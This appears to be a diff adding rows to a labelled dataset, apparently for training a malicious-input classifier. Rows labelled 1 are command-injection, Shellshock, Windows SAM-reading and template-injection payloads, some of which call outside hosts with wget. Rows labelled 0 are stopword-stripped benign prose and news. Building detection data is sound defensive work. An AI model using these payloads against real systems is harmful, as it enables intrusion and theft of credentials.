+& systeminfo,1
+&& systeminfo,1
+system('ls'),1
+system('pwd'),1
+system('pwd');,1
+|| system('sleep 5');,1
+| system('sleep 5');,1
+; system('sleep 5');,1
+& system('sleep 5');,1
+&& system('sleep 5');,1
+system('sleep 5'),1
+system('sleep 5');,1
+system('wget https://crowdshield.com/.testing/rce_vuln.txt?req=22fd2w23'),1
+system('wget https://xerosecurity.com/.testing/rce_vuln.txt');,1
+system('whoami'),1
+system('whoami');,1
+test*; ls -lhtR /var/www/,1
+"test* || perl -e 'print ""X""x16096'",1
+"test* | perl -e 'print ""X""x16096'",1
+"test* & perl -e 'print ""X""x16096'",1
+"test* && perl -e 'print ""X""x16096'",1
+"test*; perl -e 'print ""X""x16096'",1
+$(`type C:\boot.ini`),1
+&&type C:\\boot.ini,1
+| type C:\Windows\repair\SAM,1
+; type C:\Windows\repair\SAM,1
+& type C:\Windows\repair\SAM,1
+&& type C:\Windows\repair\SAM,1
+type C:\Windows\repair\SAM,1
+| type C:\Windows\repair\SYSTEM,1
+; type C:\Windows\repair\SYSTEM,1
+& type C:\Windows\repair\SYSTEM,1
+&& type C:\Windows\repair\SYSTEM,1
+type C:\Windows\repair\SYSTEM,1
+| type C:\WINNT\repair\SAM,1
+; type C:\WINNT\repair\SAM,1
+& type C:\WINNT\repair\SAM,1
+&& type C:\WINNT\repair\SAM,1
+type C:\WINNT\repair\SAM,1
+type C:\WINNT\repair\SYSTEM,1
+| type %SYSTEMROOT%\repair\SAM,1
+; type %SYSTEMROOT%\repair\SAM,1
+& type %SYSTEMROOT%\repair\SAM,1
+&& type %SYSTEMROOT%\repair\SAM,1
+type %SYSTEMROOT%\repair\SAM,1
+| type %SYSTEMROOT%\repair\SYSTEM,1
+; type %SYSTEMROOT%\repair\SYSTEM,1
+& type %SYSTEMROOT%\repair\SYSTEM,1
+&& type %SYSTEMROOT%\repair\SYSTEM,1
+type %SYSTEMROOT%\repair\SYSTEM,1
+uname,1
+;uname;,1
+| uname -a,1
+; uname -a,1
+& uname -a,1
+&& uname -a,1
+uname -a,1
+|/usr/bin/id,1
+;|/usr/bin/id|,1
+;/usr/bin/id|,1
+$;/usr/bin/id,1
+"() { :;};/usr/bin/perl -e 'print \""Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\"";system(\""wget http://135.23.158.130/.testing/shellshock.txt?vuln=13;curl http://135.23.158.130/.testing/shellshock.txt?vuln=15;\"");'",1
+() { :;}; wget http://135.23.158.130/.testing/shellshock.txt?vuln=11,1
+| wget http://crowdshield.com/.testing/rce.txt,1
+& wget http://crowdshield.com/.testing/rce.txt,1
+; wget https://crowdshield.com/.testing/rce_vuln.txt,1
+$(`wget https://crowdshield.com/.testing/rce_vuln.txt`),1
+&& wget https://crowdshield.com/.testing/rce_vuln.txt,1
+wget https://crowdshield.com/.testing/rce_vuln.txt,1
+$(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`),1
+which curl,1
+which gcc,1
+which nc,1
+which netcat,1
+which perl,1
+which python,1
+which wget,1
+whoami,1
+| whoami,1
+; whoami,1
+' whoami,1
+' || whoami,1
+' & whoami,1
+' && whoami,1
+'; whoami,1
+""" whoami",1
+""" || whoami",1
+""" | whoami",1
+""" & whoami",1
+""" && whoami",1
+"""; whoami",1
+$(`whoami`),1
+& whoami,1
+&& whoami,1
+"{{ get_user_file(""C:\boot.ini"") }}",1
+"{{ get_user_file(""/etc/hosts"") }}",1
+{{4+4}},1
+{{4+8}},1
+{{person.secret}},1
+{{person.name}},1
+{1} + {1},1
+"{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}",1
+{{[] .__ Class __.__ base __.__ subclasses __ ()}},1
+  Add plain text Ne te quaesiveris extra,0
+" Man star; soul Render honest perfect man, Commands light, influence, fate; Nothing falls early late",0
+" Our acts angels are, good ill, Our fatal shadows walk us still",0
+" Epilogue Beaumont Fletcher’s Honest Man’s Fortune Cast bantling rocks, Suckle she-wolf’s teat; Wintered hawk fox, Power speed hands feet",0
+ I read day verses written eminent painter original conventional,0
+" The soul always hears admonition lines, let subject may",0
+ The sentiment instil value thought may contain,0
+" To believe thought, believe true private heart true men, — genius",0
+" Speak latent conviction, shall universal sense; inmost due time becomes outmost, — first thought rendered back us trumpets Last Judgment",0
+" Familiar voice mind each, highest merit ascribe Moses, Plato, Milton is, set naught books traditions, spoke men thought",0
+" A man learn detect watch gleam light flashes across mind within, lustre firmament bards sages",0
+" Yet dismisses without notice thought, his",0
+ In every work genius recognize rejected thoughts: come back us certain alienated majesty,0
+ Great works art affecting lesson us this,0
+ They teach us abide spontaneous impression good-humored inflexibility whole cry voices side,0
+" Else, to-morrow stranger say masterly good sense precisely thought felt time, shall forced take shame opinion another",0
+" There time every man’s education arrives conviction envy ignorance; imitation suicide; must take better, worse, portion; though wide universe full good, kernel nourishing corn come toil bestowed plot ground given till",0
+" The power resides new nature, none knows do, know tried",0
+" Not nothing one face, one character, one fact, makes much impression him, another none",0
+ This sculpture memory without preestablished harmony,0
+" The eye placed one ray fall, might testify particular ray",0
+" We half express ourselves, ashamed divine idea us represents",0
+" It may safely trusted proportionate good issues, faithfully imparted, God work made manifest cowards",0
+" A man relieved gay put heart work done best; said done otherwise, shall give peace",0
+ It deliverance deliver,0
+" In attempt genius deserts him; muse befriends; invention, hope",0
+ Trust thyself: every heart vibrates iron string,0
+" Accept place divine providence found you, society contemporaries, connection events",0
+" Great men always done so, confided childlike genius age, betraying perception absolutely trustworthy seated heart, working hands, predominating being",0
+" And men, must accept highest mind transcendent destiny; minors invalids protected corner, cowards fleeing revolution, guides, redeemers, benefactors, obeying Almighty effort, advancing Chaos Dark",0
+" What pretty oracles nature yields us text, face behaviour children, babes, even brutes! That divided rebel mind, distrust sentiment arithmetic computed strength means opposed purpose, not",0
+" Their mind whole, eye yet unconquered, look faces, disconcerted",0
+" Infancy conforms nobody: conform it, one babe commonly makes four five adults prattle play it",0
+" So God armed youth puberty manhood less piquancy charm, made enviable gracious claims put by, stand itself",0
+" Do think youth force, cannot speak me",0
+ Hark! next room voice sufficiently clear emphatic,0
+ It seems knows speak contemporaries,0
+" Bashful bold, then, know make us seniors unnecessary",0
+" The nonchalance boys sure dinner, would disdain much lord say aught conciliate one, healthy attitude human nature",0
+" A boy parlour pit playhouse; independent, irresponsible, looking corner people facts pass by, tries sentences merits, swift, summary way boys, good, bad, interesting, silly, eloquent, troublesome",0
+" He cumbers never consequences, interests: gives independent, genuine verdict",0
+ You must court him: court you,0
+" But man is, were, clapped jail consciousness",0
+" As soon acted spoken eclat, committed person, watched sympathy hatred hundreds, whose affections must enter account",0
+ There Lethe this,0
+" Ah, could pass neutrality! Who thus avoid pledges, observed, observe unaffected, unbiased, unbribable, unaffrighted innocence, must always formidable",0
+" He would utter opinions passing affairs, seen private, necessary, would sink like darts ear men, put fear",0
+" These voices hear solitude, grow faint inaudible enter world",0
+ Society everywhere conspiracy manhood every one members,0
+" Society joint-stock company, members agree, better securing bread shareholder, surrender liberty culture eater",0
+ The virtue request conformity,0
+ Self-reliance aversion,0
+" It loves realities creators, names customs",0
+ Whoso would man must nonconformist,0
+" He would gather immortal palms must hindered name goodness, must explore goodness",0
+ Nothing last sacred integrity mind,0
+" Absolve yourself, shall suffrage world",0
+" I remember answer quite young I prompted make valued adviser, wont importune dear old doctrines church",0
+" On saying, What I sacredness traditions, I live wholly within? friend suggested, — But impulses may below, above",0
+" I replied, They seem such; I Devil’s child, I live Devil",0
+ No law sacred nature,0
+" Good bad names readily transferable this; right constitution, wrong it",0
+" A man carry presence opposition, every thing titular ephemeral he",0
+" I ashamed think easily capitulate badges names, large societies dead institutions",0
+ Every decent well-spoken individual affects sways right,0
+" I ought go upright vital, speak rude truth ways",0
+" If malice vanity wear coat philanthropy, shall pass? If angry bigot assumes bountiful cause Abolition, comes last news Barbadoes, I say him, ‘Go love thy infant; love thy wood-chopper: good-natured modest: grace; never varnish hard, uncharitable ambition incredible tenderness black folk thousand miles off",0
+ Thy love afar spite home,0
+"’ Rough graceless would greeting, truth handsomer affectation love",0
+" Your goodness must edge it, — else none",0
+ The doctrine hatred must preached counteraction doctrine love pules whines,0
+" I shun father mother wife brother, genius calls me",0
+" I would write lintels door-post, Whim",0
+" I hope somewhat better whim last, cannot spend day explanation",0
+ Expect show cause I seek I exclude company,0
+" Then, again, tell me, good man to-day, obligation put poor men good situations",0
+" Are poor? I tell thee, thou foolish philanthropist, I grudge dollar, dime, cent, I give men belong I belong",0
+" There class persons spiritual affinity I bought sold; I go prison, need be; miscellaneous popular charities; education college fools; building meeting-houses vain end many stand; alms sots; thousandfold Relief Societies; — though I confess shame I sometimes succumb give dollar, wicked dollar I shall manhood withhold",0
+" Virtues are, popular estimate, rather exception rule",0
+ There man virtues,0
+" Men called good action, piece courage charity, much would pay fine expiation daily non-appearance parade",0
+" Their works done apology extenuation living world, — invalids insane pay high board",0
+ Their virtues penances,0
+" I wish expiate, live",0
+ My life spectacle,0
+" I much prefer lower strain, genuine equal, glittering unsteady",0
+" I wish sound sweet, need diet bleeding",0
+" I ask primary evidence man, refuse appeal man actions",0
+ I know makes difference whether I forbear actions reckoned excellent,0
+ I cannot consent pay privilege I intrinsic right,0
+" Few mean gifts may be, I actually am, need assurance assurance fellows secondary testimony",0
+" What I must concerns me, people think",0
+" This rule, equally arduous actual intellectual life, may serve whole distinction greatness meanness",0
+" It harder, always find think know duty better know it",0
+ It easy world live world’s opinion; easy solitude live own; great man midst crowd keeps perfect sweetness independence solitude,0
+" The objection conforming usages become dead is, scatters force",0
+ It loses time blurs impression character,0
+" If maintain dead church, contribute dead Bible-society, vote great party either government it, spread table like base housekeepers, — screens I difficulty detect precise man are",0
+" And, course, much force withdrawn proper life",0
+" But work, I shall know you",0
+" Do work, shall reinforce yourself",0
+ A man must consider blindman’s-buff game conformity,0
+" If I know sect, I anticipate argument",0
+ I hear preacher announce text topic expediency one institutions church,0
+" Do I know beforehand possibly say new spontaneous word? Do I know that, ostentation examining grounds institution, thing? Do I know pledged look one side, — permitted side, man, parish minister? He retained attorney, airs bench emptiest affectation",0
+" Well, men bound eyes one another handkerchief, attached one communities opinion",0
+" This conformity makes false particulars, authors lies, false particulars",0
+ Their every truth quite true,0
+" Their two real two, four real four; every word say chagrins us, know begin set right",0
+ Meantime nature slow equip us prison-uniform party adhere,0
+" We come wear one cut face figure, acquire degrees gentlest asinine expression",0
+" There mortifying experience particular, fail wreak also general history; I mean foolish face praise, forced smile put company feel ease answer conversation interest us",0
+" The muscles, spontaneously moved, moved low usurping wilfulness, grow tight outline face disagreeable sensation",0
+ For nonconformity world whips displeasure,0
+ And therefore man must know estimate sour face,0
+ The by-standers look askance public street friend’s parlour,0
+" If aversation origin contempt resistance like own, might well go home sad countenance; sour faces multitude, like sweet faces, deep cause, put wind blows newspaper directs",0
+ Yet discontent multitude formidable senate college,0
+ It easy enough firm man knows world brook rage cultivated classes,0
+" Their rage decorous prudent, timid vulnerable themselves",0
+" But feminine rage indignation people added, ignorant poor aroused, unintelligent brute force lies bottom society made growl mow, needs habit magnanimity religion treat godlike trifle concernment",0
+" The terror scares us self-trust consistency; reverence past act word, eyes others data computing orbit past acts, loath disappoint them",0
+" But keep head shoulder? Why drag corpse memory, lest contradict somewhat stated public place? Suppose contradict yourself; then? It seems rule wisdom never rely memory alone, scarcely even acts pure memory, bring past judgment thousand-eyed present, live ever new day",0
+" In metaphysics denied personality Deity: yet devout motions soul come, yield heart life, though clothe God shape color",0
+" Leave theory, Joseph coat hand harlot, flee",0
+" A foolish consistency hobgoblin little minds, adored little statesmen philosophers divines",0
+ With consistency great soul simply nothing do,0
+ He may well concern shadow wall,0
+" Speak think hard words, to-morrow speak to-morrow thinks hard words again, though contradict every thing said to-day",0
+" — ‘Ah, shall sure misunderstood",0
+"’ — Is bad, then, misunderstood? Pythagoras misunderstood, Socrates, Jesus, Luther, Copernicus, Galileo, Newton, every pure wise spirit ever took flesh",0
+ To great misunderstood,0
+ I suppose man violate nature,0
+" All sallies rounded law being, inequalities Andes Himmaleh insignificant curve sphere",0
+ Nor matter gauge try him,0
+" A character like acrostic Alexandrian stanza; — read forward, backward, across, still spells thing",0
+" In pleasing, contrite wood-life God allows me, let record day day honest thought without prospect retrospect, and, I cannot doubt, found symmetrical, though I mean not, see not",0
+ My book smell pines resound hum insects,0
+ The swallow window interweave thread straw carries bill web also,0
+ We pass are,0
+ Character teaches wills,0
+" Men imagine communicate virtue vice overt actions, see virtue vice emit breath every moment",0
+" There agreement whatever variety actions, honest natural hour",0
+" For one will, actions harmonious, however unlike seem",0
+" These varieties lost sight little distance, little height thought",0
+ One tendency unites all,0
+ The voyage best ship zigzag line hundred tacks,0
+" See line sufficient distance, straightens average tendency",0
+" Your genuine action explain itself, explain genuine actions",0
+ Your conformity explains nothing,0
+" Act singly, already done singly justify now",0
+ Greatness appeals future,0
+" If I firm enough to-day right, scorn eyes, I must done much right defend now",0
+" Be will, right now",0
+" Always scorn appearances, always may",0
+ The force character cumulative,0
+ All foregone days virtue work health this,0
+" What makes majesty heroes senate field, fills imagination? The consciousness train great days victories behind",0
+ They shed united light advancing actor,0
+ He attended visible escort angels,0
+" That throws thunder Chatham’s voice, dignity Washington’s port, America Adams’s eye",0
+ Honor venerable us ephemeris,0
+ It always ancient virtue,0
+ We worship to-day to-day,0
+" We love pay homage, trap love homage, selfdependent, self-derived, therefore old immaculate pedigree, even shown young person",0
+ I hope days heard last conformity consistency,0
+ Let words gazetted ridiculous henceforward,0
+" Instead gong dinner, let us hear whistle Spartan fife",0
+ Let us never bow apologize more,0
+ A great man coming eat house,0
+ I wish please him; I wish wish please me,0
+" I stand humanity, though I would make kind, I would make true",0
+" Let us affront reprimand smooth mediocrity squalid contentment times, hurl face custom, trade, office, fact upshot history, great responsible Thinker Actor working wherever man works; true man belongs time place, centre things",0
+" Where is, nature",0
+" He measures you, men, events",0
+" Ordinarily, every body society reminds us somewhat else, person",0
+" Character, reality, reminds nothing else; takes place whole creation",0
+" The man must much, must make circumstances indifferent",0
+" Every true man cause, country, age; requires infinite spaces numbers time fully accomplish design; — posterity seem follow steps train clients",0
+" A man Caesar born, ages Roman Empire",0
+" Christ born, millions minds grow cleave genius, confounded virtue possible man",0
+" An institution lengthened shadow one man; as, Monachism, Hermit Antony; Reformation, Luther; Quakerism, Fox; Methodism, Wesley; Abolition, Clarkson",0
+" Scipio, Milton called height Rome; history resolves easily biography stout earnest persons",0
+ Standard automatic speech recognizers output unstructured streams words,0
+" They neither perform proper segmentation output sentences, predict punctuation symbols",0
+" The unavailable punctuations sentence boundaries transcribed speech texts create barriers many subsequent processing tasks, summarization, information extraction, question answering machine translation",0
+" Thus, segmentation long texts necessary many real applications",0
+" For example, speech-to-speech translation, continuously transcribed speech texts need segmented fed subsequent machine translation systems (Takezawa et al",0
+", 1998; Nakamura, 2009)",0
+" This current machine translation (MT) systems perform translation sentence level, various models used MT trained segmented sentences many algorithms inside MT exponential complexity regard length inputs",0
+ The punctuation prediction problem attracted research interest speech processing community natural language processing community,0
+" Most previous work primarily exploits local features statistical models lexicons, prosodic cues hidden event language model (HELM) (Liu et al",0
+", 2005; Matusov et al",0
+", 2006; Huang Zweig, 2002; Stolcke Shriberg, 1996)",0
+ The word-level models integrating local features narrow views input could achieve satisfied performance due limited context information access (Favre et al,0
+", 2008)",0
+" Naturally, global contexts required model punctuation prediction, especially long-range dependencies",0
+" For instance, English question sentences, ending question mark long-range dependent initial phrases (Lu Ng, 2010), could Figure 1",0
+ There work trying incorporate syntactic features broaden view hypotheses punctuation prediction models (Roark et al,0
+", 2006; Favre et al",0
+", 2008)",0
+" In methods, punctuation prediction treated separated post-procedure parsing, may suffer problem error propagation",0
+" In addition, approaches able incrementally process inputs efficient long inputs, especially cases long transcribed speech texts presentations number streaming words could larger hundreds thousands",0
+" In paper, propose jointly performing punctuation prediction transition-based dependency parsing transcribed speech text",0
+" When transition-based parsing consumes stream words left right shift-reduce decoding algorithm, punctuation symbols predicted word based contexts parsing tree",0
+ Two models proposed cause punctuation prediction interact transition actions parsing,0
+ One conduct transition actions parsing followed punctuation predictions cascaded way,0
+" The associate conventional transition actions parsing punctuation perditions, predicted punctuations directly inferred parsing tree",0
+ Our models linear complexity capable handling streams words length,0
+" In addition, computation models use rich set syntactic features, improve complicated punctuation predictions global view, especially long range dependencies",0
+ Figure 1 shows example parsing helps punctuation prediction transcribed speech text,0
+" As illustrated Figure 1(b), two commas predicted preceding words act adverbial modifiers (advmod) parsing",0
+ The period word menu predicted parsing adverbial clause modifier (advcl) completed,0
+" The question mark end input determined direct object modifier (dobj) identified, together long range clue auxiliary word occurs nominal subject (nsubj)",0
+" Eventually, two segmentations formed according punctuation prediction results, shown Figure 1(c)",0
+" The training data used models adapted Treebank data excluding punctuations keeping punctuation contexts, simulate unavailable annotated transcribed speech texts",0
+" In decoding, beam search used get optimal punctuation prediction results",0
+ We conduct experiments IWSLT data TDT4 test data sets,0
+ The experimental results show method achieve higher performance CRF-based baseline method,0
+ The paper structured follows: Section 2 conducts survey related work,0
+ The transitionbased dependency parsing introduced Section 3,0
+ We explain approach predicting punctuations transcribed speech texts Section 4,0
+ Section 5 gives results experiment,0
+ The conclusion future work given Section 6,0
+ Sentence boundary detection punctuation prediction extensively studied speech processing field attracted research interest natural language processing field well,0
+ Most previous work exploits local features task,0
+" Kim Woodland (2001), Huang Zweig (2002), Christensen et al",0
+" (2001), Liu et al",0
+" (2005) integrate prosodic features (pitch, pause duration, etc",0
+") lexical features (words, n-grams, etc",0
+") predict punctuation symbols speech recognition, Huang Zweig (2002) uses maximum entropy model, Christensen et al",0
+" (2001) focus finite state multi-layer perceptron methods, Liu et al",0
+ (2005) uses conditional random fields,0
+" However, scenarios prosodic cues available due inaccessible original raw speech waveforms",0
+ Matusov et al,0
+ (2006) integrate segmentation features log-linear model statistical machine translation (SMT) framework improve translation performance translating transcribed speech texts,0
+ Lu Ng (2010) uses dynamic conditional random fields perform sentence boundary sentence type prediction,0
+ They achieved promising results English Chinese transcribed speech texts,0
+" The work exploits local features, limited capturing long range dependencies punctuation prediction",0
+" It natural incorporate global knowledge, syntactic information, improve punctuation prediction performance",0
+ Roark et al,0
+ (2006) use rich set non-local features including parser scores re-rank full segmentations,0
+ Favre et al,0
+ (2008) integrate syntactic information PCFG parser log-linear combine local features sentence segmentation,0
+" The punctuation prediction works performed post-procedure step parsing, parse tree needs built advance",0
+" As parsing stream words transcribed speech text exponentially complex, approaches feasible short input processing",0
+" Unlike works, incorporate punctuation prediction parsing process left right input without length limitations",0
+" Numerous dependency parsing algorithms proposed natural language processing community, including transition-based graph-based dependency parsing",0
+" Compared graph-based parsing, transition-based parsing offer linear time complexity easily leverage non-local features models (Yamada Matsumoto, 2003; Nivre et al",0
+", 2006b; Zhang Clark, 2008; Huang Sagae, 2010)",0
+" Starting work (Zhang Nivre, 2011), paper extend transition-based dependency parsing sentence-level stream words integrate parsing punctuation prediction",0
+ Joint POS tagging transition-based dependency parsing studied (Hatori et al,0
+", 2011; Bohnet Nivre, 2012)",0
+" The improvements reported joint model compared pipeline model Chinese richly inflected languages, shows also makes sense jointly perform punctuation prediction parsing, although two tasks POS tagging punctuation prediction different two ways: 1)",0
+ The former usually works well-formed single sentence latter needs process multiple sentences lengthy,0
+ 2),0
+ POS tags must-have features parsing punctuations not,0
+ The parsing quality former sensitive performance entire task latter,0
+ Orlando Bloom Miranda Kerr still love Actors Orlando Bloom Model Miranda Kerr want go separate ways ,0
+" However , interview , Bloom said Kerr still love ",0
+ Miranda Kerr Orlando Bloom parents two-year-old Flynn ,0
+" Actor Orlando Bloom announced separation wife , supermodel Miranda Kerr ",0
+" In interview US journalist Katie Couric , broadcast Friday (local time), Bloom said , &quot; sometimes life &apos;t go exactly plan hope &quot; ",0
+" He Kerr still love , emphasised 36-year-old ",0
+ &quot; We &apos;re going support one another love parents Flynn &quot; ,0
+ Kerr Bloom married since 2010 ,0
+ Their son Flynn born 2011 ,0
+" Jet makers feud seat width big orders stake A row flared leading plane makers width tourist-class seats long-distance flights , setting tone bitter confrontation month &apos;s Dubai Airshow ",0
+" The dispute focuses width seats provided long-haul flights economy passengers - always ones courted airlines , whose allocated space holds key efficiency claims latest jets offered Airbus SAS Boeing Co ",0
+" Airbus week called industry standard would provide seat least 18 inches (46 cm) wide economy cabins , U",0
+S,0
+ arch-rival Boeing says airlines decide ,0
+" The dispute comes plane makers vie sell ever-larger versions twin-engined long-distance aircraft , potentially record orders expected November 17-21 event ",0
+ How back plane laid - particularly whether seating 9 10 abreast - central economic performance claims made new &quot; mini-jumbo &quot; jet designs ,0
+ Boeing says revamped &quot; 777X &quot; hold 406 people based economy seats 17 inches wide set 10 row ,0
+ Airbus says competing version A350 carry 350 people 18-inch-wide economy seat laid 9 abreast ,0
+ Plane giants often trade blows technical matters advertising trade press ,0
+" Now , Airbus appealing directly public ahead Dubai Airshow , 777X expected dominate 100 orders ",0
+" It recently previewed may start new ad war showing financiers slide illustrating three people squashed together restaurant , titled &quot; Would You Accept This ? &quot; &quot; Boeing proposing long-distance flying seats narrower regional turbo-props , &quot; said Airbus sales chief John Leahy ",0
+" As diets change , people get bigger plane seating radically changed ",0
+" Between early 1970s , Boeing 747 jumbo defined modern long-haul travel , turn century , weight average American 40- 49-year-old male increased 10 per cent , according U",0
+S,0
+ Health Department Data ,0
+ The waist average 21st-century American male 39,0
+"7 inches , according U",0
+S,0
+ health statistics ,0
+" Airbus says rival sticking seat concept 1950s , average girth newly christened &quot; jet set &quot; narrower ",0
+ Airbus says commissioned research suggesting extra inch seat width improves sleep quality 53 per cent ,0
+ Boeing disputes Airbus &apos;s figures seat measurements says manufacturers step decisions airlines balance fares facilities ,0
+ It also says research shows cabin experience depends width seat ,0
+" &quot; It really comes providing flexibility airlines allowing things believe need successful , &quot; said Boeing cabins expert Kent Craver ",0
+ They &apos;t want us dictate makes profitable ,0
+ They know business better anyone else ,0
+" For flyers elbow room , suppliers increasingly issue could affect earnings ",0
+" Behind dispute race plane orders least $ 700-billion estimated business list prices coming decades , enough tip scales U",0
+S,0
+ European exports ,0
+" As Reuters first reported July , seat layout exactly drives battle latest jets ",0
+" Both Airbus Boeing claim 20 per cent better efficiency per seat latest twin-engined long-haul designs market leader segment , 365-seat Boeing 777-300ER ",0
+ Boeing &apos;s performance claims depend part comparing 10-abreast 777X original 9-abreast 777 design ,0
+ The gain unit costs blunted compared 10-abreast use ,0
+" &quot; The reason Boeing cram seats make plane competitive products , &quot; said Kevin Keniston , head passenger comfort Europe &apos;s Airbus ",0
+" On hand , analysts say full 10-seat-per-row cabins existing 777s suggest many passengers voting denser layout , may go hand hand cheaper fares ",0
+" &quot; Eighteen inches seat width would great passengers , reality business point Airbus proposal driven threat 777 , &quot; said cabin interiors expert Mary Kirby , founder editor Runway Girl Network ",0
+ Airbus Boeing supply seats offer catalogue suppliers airlines choose ,0
+ Globe-trotting jet sellers even carry tape measures check competing layouts ,0
+" While boasting comfort , builders also offer jets high-density layouts low-cost airlines regional travel ",0
+ Airbus offers 10-abreast A350 says yet sold ,0
+" Until recently , Airbus stressing need cabin customization offering wider aisle seats jets ",0
+" Without support maker large modern jets , experts say call new industry standard unlikely fly , could distract wave 777X sales ",0
+ The FAA easing restrictions use electronic gadgets airplanes - though chatting cellphones still prohibited ,0
+" Warplanes attack store Russian missiles port city Latakia , official says ",0
+ It &apos;s apparent continuation Israel &apos;s campaign keep arms proliferating Mideast ,0
+ A federal appeals court blocks judge &apos;s ruling NYPD &apos;s controversial tactic discriminates minorities ,0
+ Nearly 100 African migrants hoping travel Algeria die thirst two trucks break middle Sahara ,0
+" Experts say violence left 14 adults seven children dead nothing random chance , sign growing violence America ",0
+ Rather rattled U,0
+S,0
+" government shutdown , investors kept focus probably matters more: Federal Reserve ",0
+" The California woman plans challenge may first-of-its-kind citation , saying Internet-connected eyewear makes navigation easier ",0
+ Police say video appears show Mayor Rob Ford smoking crack pipe ,0
+ Even close allies keep things one another - work every angle find &apos;s held back ,0
+" The Vatican wants know Catholic parishes around globe handle sensitive issues like contraception , divorce gay couples ",0
+" Persons seriously injured following collision Early Friday afternoon , two car drivers seriously injured head-on collision Landesstraße 44 (a rural road)",0
+" The police completely blocked road immediately , initially could make much comment cause accident ",0
+" However , mention various witness statements first assessed ",0
+ What certain 19-year-old female driver VW Golf driving direction Revensdorf 38-year-old man Gettorf came towards Hyundai ,0
+" The two vehicles collided , whereby woman severely stuck took fire service almost half hour free vehicle wreckage ",0
+ Initially actual cause accident remained unclear ,0
+ Both unfortunate parties taken nearby hospitals ,0
+ The road remained fully blocked around two hours ,0
+ Fire crews called rescue lost puppy got stuck 50ft ground precarious ledge quarry Cocker spaniel Ruby run minor road crash She spotted three days later dog walker trapped quarry Firefighters abseil cliff face pluck dog certain death A puppy lucky escape fire crews called lift safety somehow got stuck 50ft precarious cliff ledge ,0
+ Nine month-old cocker spaniel Ruby run involved road crash Sunday afternoon survived three days alone rescued quarry Wednesday ,0
+" Her owners Scott Alderson , 25 , girlfriend Becky Hall , 20 , Flappit Quarry Denholme , West Yorkshire , reunited Ruby thanked West Yorkshire Fire Rescue Service ",0
+ They searched frantically missing dog posted appeals social networking sites ran quarry following minor accident ,0
+ At around 2,0
+"15pm Wednesday , eagle-eyed dog walker spotted Ruby ledge quarry , stranded 50ft ",0
+ A Technical Rescue Team Cleckheaton Fire Station rushed scene abseiled rescue Ruby used pet tube transport cliff ,0
+ Specialist Technical Rescue Officer Andy Clayton said: &apos; She precarious situation ,0
+ She right middle cliff face - 50ft top bottom ,0
+ She move muscle rescue - frozen solid ,0
+ But fine ,0
+ She eating biscuits afterwards ,0
+ This unusual call-out ,0
+ The fact dog spotted unbelievable ,0
+ Specialist Technical Rescue Officer Peter Lau said: &quot; Ruby lucky escape ,0
+ &quot; The potential could seriously injured worse ,0
+ Ruby taken vets check-up found fine exhaustion dehydration ,0
+" Miss Hall , Halifax , West Yorkshire , said: &quot; Watching rescue terrifying ",0
+ &quot; I could believe first place ,0
+ It amazing get back arms ,0
+ The vet said became exhausted collapsed would probably fallen ,0
+ The firefighters amazing ,0
+ It really daring ,0
+ We grateful every single one absolutely tremendous ,0
+" Mr Alderson , Keighley , added: &quot; We scared might fall stayed ",0
+ &quot; The firefighters brilliant ,0
+ I &apos;t believe ,0
+" Report: Obama campaign considered dumping Biden Hillary Clinton President Barack Obama &apos;s closest advisers secretly considered replacing Vice President Joe Biden Hillary Clinton 2012 ticket , according New York Times ",0
+" The revelation notable bombshell Mark Halperin John Heilemann &apos;s heavily anticipated 2012 campaign tome , &quot; Double Down: Game Change 2012 ",0
+ &quot; The Times obtained copy forthcoming book reported Thursday evening President &apos;s top aides conducted &quot; extensive group-sessions polling late 2011 &quot; gauge whether dumping Biden could help bolster Obama &apos;s waning re-election hopes ,0
+" According Times &apos; national political correspondent Jonathan Martin , book provides thorough account effort senior officials inside campaign White House , namely former White House Chief Staff Bill Daley , measure effect swapping former Secretary State Clinton Vice President would polls ",0
+ The potential switch closely guarded secret within Chicago campaign infrastructure inside Oval Office ,0
+" Only half dozen President &apos;s closest advisers -- including Daley , former Obama campaign chief Jim Messina , former White House senior advisers David Axelrod David Plouffe -- knew change consideration ",0
+" &quot; Double Down &quot; claims Daley spearheaded effort replace Biden , despite &quot; close personal rapport , &quot; ultimately deciding move data showed adding Clinton ticket &apos;t &quot; materially improve Obama &apos;s odds ",0
+" &quot; In interview Martin , Daley confirmed administration fact consider replacing Biden Clinton ",0
+" &quot; I vocal looking whole bunch things , one , &quot; Daley told paper ",0
+" You remember , point President awful shape , like , &quot; Holy Christ , ? &quot; While Daley characterized research &quot; due diligence , &quot; Martin told CNN &apos;s Anderson Cooper re-election campaign made significant investment finding whether move would pay dividends polls ",0
+" &quot; Campaigns &apos;t spend kind money polling focus groups unless &apos;re seriously considering something , &quot; Martin said AC360 ",0
+" It &apos;s unclear , however , whether Obama knew team exploring swap ",0
